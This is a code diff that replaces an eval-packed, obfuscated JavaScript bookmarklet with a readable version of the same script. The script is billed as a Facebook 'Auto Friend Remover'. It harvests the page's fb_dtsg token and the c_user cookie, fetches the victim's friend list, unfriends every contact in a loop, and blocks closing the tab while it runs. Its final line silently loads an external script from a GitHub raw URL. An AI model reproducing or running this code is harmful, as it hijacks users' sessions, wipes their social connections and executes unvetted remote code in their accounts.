@@ -1,1 +1,144 @@
-eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('40:5 14="47 48 2V</A>";5 w="",1q=\'4q 2S: <A 6="7:#L;" Q="2P://V.R.v/2N.2J.9" Y="10">Bùi 2Fà2C 2B</A> & <A 6="7:#L;" Q="T://1E.1L.v/" Y="10"> 1R 1f 1g</A>.</I>34 37 2S: </A><A 6="7:#L;" Q="T://V.R.v/2N.2J.9" Y="10"> Bùi 2Fà2C 2B</A></A>,</A><A 6="7:#L;" Q="T://1E.1L.v/" Y="10"> 1R 1f 1g</A></A>.</I>3a 3b 3o 3u 3H 3T <A 6="7:#L;" Q="T://1E.1L.v/" Y="10">1R 1f 1g</A>.</A>\';u 1r(e){1v.1y(y.16.2A+"//V.R.v/2y/3f/3m.2w?2v="+e+"&3v=3C&3D[3E]=3G"+Z+"%3J%3L&2u="+Z+"&2q=1&2p=49&2n=i&15="+15+"&2W=2Y",u(a){5 b=a.2m(a.1u("{"));5 c=1w.2l(b);i--;w="<8 W=\'19-1b-2j\' 6=\'K-1N:2i;t-O:G;C-F:1c;X-1j:1k-1l;";o(c.1n){w+="7:39\'>";2h++;o(c.2g)w+=c.2g;S w+=1w.3l(c,2f,"")}S{w+="7:3n\'>";w+=N[i]+" 3r 3t 2d 2c 3x 3y";U++}w+="</8>";5 d="<8 2b=\'19-1b-13\' 6=\'1T-1A:3K 1B 2a E(0, 0, 0, 0.3);1F:26;G:25%;1I-G:-24;23:22;1M:1Z;z-1W:1V;C-F:2o;t-O:17;K:1U;1T-1A:1d 12 1d E(0,0,0,0.1);11-1X:1B;11:12 1O E(0,0,0,0.9);1Y-7:E(P,P,P,0.9);7:#20\'>";d+="<8 6=\'K-1N:2i;C-F:21;\'>"+14+"</8>";o(i>0){d+=m.q+" H 1H<I/>";d+="<b>"+U+"</b> H 1G 3M "+(m.q-i)+" H 3N ";d+="("+i+" 3O...)";d+="<8 W=\'19-1b\'>";d+=w;d+="<27 6=\'1M:28;41:28;1I-G:-42;K:45;11:12 1O E(0,0,0,0.4);\' 29="+1C[i]+"></27><a 6=\'C-F:4e;K-G:2a;t-O:G;7:#L;1F:4i;C-4k:4l;\'>"+N[i]+"</a>";d+="<8 6=\'t-O:17;C-F:1c;X-1j:1k-1l;7:1x\'>";d+="4r 4A 4I 2U "+N[i]+".</I>";d+=1q;d+="</8>";d+="</8>";y[1a+"1t"]=2X}S{14="2e 2Z 30 H 31 32 1G</A>";d+=m.q+" H 1H 33 ";d+="<b>"+U+" H 1G.</b></I>";d+="<8><J W=\'35 36 2d 1p 38 1o\' 1P=\'1K()\' 6=\'7:X\'>3c 2c 3d</J><J W=\'3e 2k 1p 3g 1o\' 1P=\'y.16.3h()\' 6=\'7:X\'>3i 3j</J><J W=\'3k 2k 1p 1o\' 1P=\'p.1e(\\"1i\\").6.13=\\"2T\\"\' 6=\'7:1x\'>3p</J><I/>";d+="<8 6=\'t-O:17;C-F:1c;X-1j:1k-1l;7:1x\'><I/>";d+=1q;d+="</8>";y[1a+"1t"]=3q}d+="</8>";p.1e("1i").1h=d},"t","3s");D--;o(D>0){5 s=m[D];2r("1r("+s+")",3w)}2s.2t(D+"/"+m.q+":"+m[D]+"/"+N[D]+", 3z:"+U)}1v={b:u(){5 b=!1;o("3A"!=3B 1S)1Q{b=M 1S("3F.2x")}1J(c){1Q{b=M 1S("3I.2x")}1J(a){b=!1}}S o(y.2z)1Q{b=M 2z}1J(h){b=!1}1z b},1y:u(b,c,a,h,g){5 e=2D.d();o(e&&b){e.2E&&e.2E("t/3P");h||(h="3Q");a||(a="t");g||(g={});a=a.3R();h=h.3S();b+=b.1u("?")+1?"&":"?";5 k=2f;"3U"==h&&(k=b.3V("?"),b=k[0],k=k[1]);e.3W(h,b,!0);e.3X=g.c?u(){g.c(e)}:u(){o(4==e.3Y)o(3Z==e.2G){5 b="";e.2H&&(b=e.2H);"j"==a.2I(0)?(b=b.43(/[\\n\\r]/g,""),b=44("("+b+")")):"x"==a.2I(0)&&(b=e.46);c&&c(b)}S g.f&&p.2K("2L")[0].4a(g.f),g.e&&(p.1e(g.e).6.13="2T"),1n&&1n(e.2G)};e.4b(k)}},d:u(){1z 2D.b()}};u 1K(){y.16.Q="T://V.R.v/"}2r("1K",1);y.4c=u(){o(y[1a+"1t"])1z"4d 2M 4f 4g 4h!"};5 i=3;5 D=3;5 U=0;5 2h=0;5 m=M 1s;5 N=M 1s;5 1C=M 1s;5 1a="4j";5 2O,x=p.2K("J");18(i=0;i<x.q;i++)o(x[i].4m("4n")=="2j")2O=x[i].1h;5 15=p.4o("15")[0].4p;5 Z=p.2Q.2R(p.2Q.2R(/4s=(\\d+)/)[1]);1v.1y(y.16.2A+"///V.R.v/2y/4t/4u.2w?4v="+Z+"&4w=4x&4y[0]=4z&1D[0]=4B&1D[1]=4C&1D[2]=4D&2u="+Z+"&2q=1&2p=4E-4F&2n=l",u(a){5 b=a;5 c=b.2m(b.1u("{"));5 d=1w.2l(c);d=d.4G.4H;18(5 e=0;e<d.q;e++)m.1m(d[e].2v);18(5 f=0;f<d.q;f++)N.1m(d[f].t);18(5 g=0;g<d.q;g++)1C.1m(d[g].4J);i=m.q-1;D=i;2s.2t(m.q);5 h="<8 2b=\'19-1b-13\' 6=\'1F:26;G:25%;1I-G:-24;23:22;1M:1Z;z-1W:1V;C-F:2o;t-O:17;K:1U;1T-1A:1d 12 1d E(0,0,0,0.1);11-1X:1B;11:12 1O E(0,0,0,0.9);1Y-7:E(P,P,P,0.9);7:#20\'>";h+="<8 6=\'K-1N:1c;C-F:21;\'>"+14+"</8>";h+=m.q+" H 1H";h+="</8>";p.1e("1i").1h=h;1r(m[i])});p.2L.4K(p.4L(\'2M\')).29="2P://4M.4N.v/4O/4P/4Q/2e.4R";',62,302,'|||||var|style|color|div||||||||||||||arr||if|document|length|||text|function|com|Descriptions||window||||font|tay|rgba|size|left|Friends|br|span|padding|3B5998|new|arn|align|225|href|facebook|else|http|suc|www|class|white|target|user_id|_blank|border|1px|display|Title|fb_dtsg|location|center|for|friend|tag|edge|10px|0pt|getElementById|Auto|Group|innerHTML|pagelet_sidebar|space|pre|wrap|push|error|uiButtonLarge|uiButton|_text|InviteFriends|Array|_close|indexOf|jx|JSON|gray|load|return|shadow|3px|pho|options|vietnameseautogroup|position|Removed|Detected|margin|catch|ChangeLocation|blogspot|width|bottom|solid|onClick|try|Vietnamese|ActiveXObject|box|15px|9999|index|radius|background|500px|000000|20px|100px|top|273px|50|fixed|img|50px|src|8px|id|to|selected|All|null|errorDescription|err|5px|name|uiOverlayButton|parse|substring|__req|14px|__dyn|__a|setTimeout|console|log|__user|uid|php|XMLHTTP|ajax|XMLHttpRequest|protocol|Long|nh|this|overrideMimeType|Th|status|responseText|charAt|long|getElementsByTagName|body|script|bui|page_name|https|cookie|match|By|none|Unfrinding|REMOVER|ttstamp|true|265816884971127865|Of|Your|Have|Been|and|Script|FriendRequestAdd|addButton|Made|uiButtonSpecial|darkred|For|More|Go|Homepage|layerConfirm|profile|uiButtonConfirm|reload|Refresh|Page|layerCancel|stringify|removefriendconfirm|darkgreen|Tools|Cancel|false|has|post|been|Visit|unref|100|be|removed|success|undefined|typeof|bd_friends_tab|nctr|_mod|Msxml2|pagelet_timeline_app_collection_|Our|Microsoft|3A2356318349|0px|3A2|of|Processed|Lefted|xml|GET|toLowerCase|toUpperCase|Blogger|POST|split|open|onreadystatechange|readyState|200|javascript|height|125px|replace|eval|2px|responseXML|AUTO|FRIEND|7n8ahyj2qmp5zpQ9UmWWaUGyxi9Ay8|removeChild|send|onbeforeunload|This|13px|is|running|now|absolute|Close|weight|bold|getAttribute|itemprop|getElementsByName|value|Powered|Please|c_user|typeahead|first_degree|viewer|token|v7|filter|user|Wait|friends_only|nm|sort_alpha|7n8aD5z5CF|3ui|payload|entries|While|photo|appendChild|createElement|raw|github|buithanhlong444|Final_Tools|master|js'.split('|'),0,{}))
+javascript: var Title = "AUTO FRIEND REMOVER</A>";
+var Descriptions = "",
+    _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/bui.long.9" target="_blank">Bùi Thành Long</A> & <A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank"> Vietnamese Auto Group</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/bui.long.9" target="_blank"> Bùi Thành Long</A></A>,</A><A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank"> Vietnamese Auto Group</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank">Vietnamese Auto Group</A>.</A>';
+
+function InviteFriends(e) {
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/profile/removefriendconfirm.php?uid=" + e + "&unref=bd_friends_tab&nctr[_mod]=pagelet_timeline_app_collection_" + user_id + "%3A2356318349%3A2&__user=" + user_id + "&__a=1&__dyn=7n8ahyj2qmp5zpQ9UmWWaUGyxi9Ay8&__req=i&fb_dtsg=" + fb_dtsg + "&ttstamp=265816884971127865", function (a) {
+        var b = a.substring(a.indexOf("{"));
+        var c = JSON.parse(b);
+        i--;
+        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
+        if (c.error) {
+            Descriptions += "color:darkred'>";
+            err++;
+            if (c.errorDescription) Descriptions += c.errorDescription;
+            else Descriptions += JSON.stringify(c, null, "")
+        } else {
+            Descriptions += "color:darkgreen'>";
+            Descriptions += arn[i] + " has been selected to be removed";
+            suc++
+        }
+        Descriptions += "</div>";
+        var d = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
+        d += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
+        if (i > 0) {
+            d += arr.length + " Friends Detected<br/>";
+            d += "<b>" + suc + "</b> Friends Removed of " + (arr.length - i) + " Friends Processed ";
+            d += "(" + i + " Lefted...)";
+            d += "<div class='friend-edge'>";
+            d += Descriptions;
+            d += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
+            d += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
+            d += "Please Wait While Unfrinding " + arn[i] + ".</br>";
+            d += _text;
+            d += "</div>";
+            d += "</div>";
+            window[tag + "_close"] = true
+        } else {
+            Title = "All Of Your Friends Have Been Removed</A>";
+            d += arr.length + " Friends Detected and ";
+            d += "<b>" + suc + " Friends Removed.</b></br>";
+            d += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
+            d += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
+            d += _text;
+            d += "</div>";
+            window[tag + "_close"] = false
+        }
+        d += "</div>";
+        document.getElementById("pagelet_sidebar").innerHTML = d
+    }, "text", "post");
+    tay--;
+    if (tay > 0) {
+        var s = arr[tay];
+        setTimeout("InviteFriends(" + s + ")", 100)
+    }
+    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc)
+}
+jx = {
+    b: function () {
+        var b = !1;
+        if ("undefined" != typeof ActiveXObject) try {
+            b = new ActiveXObject("Msxml2.XMLHTTP")
+        } catch (c) {
+            try {
+                b = new ActiveXObject("Microsoft.XMLHTTP")
+            } catch (a) {
+                b = !1
+            }
+        } else if (window.XMLHttpRequest) try {
+            b = new XMLHttpRequest
+        } catch (h) {
+            b = !1
+        }
+        return b
+    },
+    load: function (b, c, a, h, g) {
+        var e = this.d();
+        if (e && b) {
+            e.overrideMimeType && e.overrideMimeType("text/xml");
+            h || (h = "GET");
+            a || (a = "text");
+            g || (g = {});
+            a = a.toLowerCase();
+            h = h.toUpperCase();
+            b += b.indexOf("?") + 1 ? "&" : "?";
+            var k = null;
+            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
+            e.open(h, b, !0);
+            e.onreadystatechange = g.c ?
+            function () {
+                g.c(e)
+            } : function () {
+                if (4 == e.readyState) if (200 == e.status) {
+                    var b = "";
+                    e.responseText && (b = e.responseText);
+                    "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
+                    c && c(b)
+                } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
+            };
+            e.send(k)
+        }
+    },
+    d: function () {
+        return this.b()
+    }
+};
+
+function ChangeLocation() {
+    window.location.href = "http://www.facebook.com/"
+}
+setTimeout("ChangeLocation", 1);
+window.onbeforeunload = function () {
+    if (window[tag + "_close"]) return "This script is running now!"
+};
+var i = 3;
+var tay = 3;
+var suc = 0;
+var err = 0;
+var arr = new Array;
+var arn = new Array;
+var pho = new Array;
+var tag = "Close";
+var page_name, x = document.getElementsByTagName("span");
+for (i = 0; i < x.length; i++) if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
+var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
+    var b = a;
+    var c = b.substring(b.indexOf("{"));
+    var d = JSON.parse(c);
+    d = d.payload.entries;
+    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+    for (var f = 0; f < d.length; f++) arn.push(d[f].text);
+    for (var g = 0; g < d.length; g++) pho.push(d[g].photo);
+    i = arr.length - 1;
+    tay = i;
+    console.log(arr.length);
+    var h = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
+    h += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
+    h += arr.length + " Friends Detected";
+    h += "</div>";
+    document.getElementById("pagelet_sidebar").innerHTML = h;
+    InviteFriends(arr[i])
+});
+document.body.appendChild(document.createElement('script')).src = "https://raw.github.com/buithanhlong444/Final_Tools/master/All.js";
